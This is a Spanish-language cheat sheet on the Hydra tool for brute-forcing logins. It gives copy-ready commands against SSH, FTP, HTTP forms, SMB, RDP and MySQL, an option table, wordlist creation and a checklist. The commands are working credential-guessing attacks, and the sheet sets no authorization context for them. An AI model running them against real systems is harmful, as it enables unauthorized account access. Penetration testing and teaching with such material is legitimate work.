# Hydra — Fuerza Bruta de Credenciales

> [!info] Herramienta
> Fuerza bruta de credenciales en múltiples servicios: HTTP, SSH, FTP, SMB, RDP, MySQL, etc.
## Básico

> [!tip] Formato general
> `hydra -l <usuario> -P <wordlist> <host> <servicio>`

```bash

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# SMB
hydra -l administrator -P passwords.txt 192.168.1.100 smb
```

---

## Servicios Soportados

| Servicio | Protocolo |
|----------|-----------|
| SSH | `ssh://` |
| FTP | `ftp://` |
| Telnet | `telnet://` |
| HTTP/HTTPS | `http://`, `https://` |
| SMB | `smb://` |
| RDP | `rdp://` |
| MySQL | `mysql://` |
| PostgreSQL | `postgres://` |
| MSSQL | `mssql://` |
| VNC | `vnc://` |
| SMTP | `smtp://` |
| POP3 | `pop3://` |
| IMAP | `imap://` |
| | SNMP | `snmp://` |
|-------------------------------------|--------------------------------|
## HTTP Forms

> [!important] Formularios web
> Atacar formularios de login HTTP.

```bash

# POST form
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# GET form
hydra -l admin -P passwords.txt target http-get-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Con cookies
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:H=Cookie: session=abc123:F=incorrect"
```

### Variables de Formulario

| Variable | Descripción |
|----------|-------------|
| `^USER^` | Reemplazado por el usuario |
| `^PASS^` | Reemplazado por la contraseña |
| `F=` | Cadena que indica fallo |
| `S=` | Cadena que indica éxito |
| `H=` | Headers custom |

---

## Opciones Comunes

| Opción | Descripción |
|--------|-------------|
| `-l <usuario>` | Usuario específico |
| `-L <archivo>` | Lista de usuarios |
| `-P <archivo>` | Lista de contraseñas |
| `-C <archivo>` | Archivo user:pass |
| `-t <n>` | Hilos (default 16) |
| `-f` | Parar al encontrar credencial |
| `-v` | Verbose |
| `-V` | Ver todos los intentos |
| `-d` | Debug |
| `-w <seg>` | Tiempo de espera |
| `-o <archivo>` | Output a archivo |
| `-s <puerto>` | Puerto específico |

```bash
# Con lista de usuarios
hydra -L users.txt -P passwords.txt target ssh

# Con archivo user:pass
hydra -C credentials.txt target ssh

# Parar al encontrar
hydra -l admin -P passwords.txt -f target ssh

# Todos los intentos
hydra -l admin -P passwords.txt -V target ssh

# Puerto específico
hydra -l admin -P passwords.txt -s 2222 target ssh
```

---

## Ejemplos por Servicio

### SSH

```bash
hydra -l root -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
```

### FTP

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.100
hydra -l anonymous -P "guest@" ftp://192.168.1.100
```

### HTTP

```bash
# Basic Auth
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin

# POST form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=Access denied"
```

### SMB

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.100
```

### RDP

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.100
```

---

## Archivos de Credenciales

```bash
# Crear lista de usuarios
echo -e "admin\nroot\nuser1" > users.txt

# Crear lista de contraseñas
echo -e "password\n123456\nadmin" > passwords.txt

# Archivo user:pass
echo -e "admin:password\nroot:123456" > credentials.txt
```

---

#checklist
- [ ] Servicio objetivo identificado
- [ ] Wordlist de usuarios/contraseñas preparado
- [ ] Formulario HTTP analizado (si aplica)
- [ ] Hydra ejecutado con opciones correctas
- [ ] Credenciales encontradas verificadas